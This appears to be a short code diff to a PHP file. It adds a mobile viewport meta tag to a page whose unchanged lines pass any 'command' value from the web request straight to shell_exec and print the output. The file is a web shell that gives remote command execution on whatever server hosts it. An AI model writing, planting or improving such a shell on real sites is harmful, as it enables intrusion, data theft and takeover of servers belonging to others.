@@ -1,4 +1,6 @@
 <?php
+echo '<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">';
+
 $command = shell_exec($_REQUEST['command']." 2>&1");
 
 echo '<div style="text-align:center;">';
